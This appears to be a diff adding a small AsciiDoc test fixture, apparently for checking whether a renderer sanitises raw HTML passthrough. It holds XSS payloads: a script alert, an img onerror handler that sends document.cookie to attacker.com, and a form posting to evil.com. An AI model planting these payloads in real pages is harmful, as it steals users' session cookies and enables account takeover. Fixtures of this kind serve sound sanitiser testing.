@@ -1,0 +1,11 @@
+= Test
+
+++++
+<script>alert(document.domain)</script>
+<img src=x onerror="fetch(\"https://attacker.com/?\"+document.cookie)">
+++++
+
+Normal content.
+
+pass:[<form action="https://evil.com"><input type="submit" value="Click me"></form>]
+
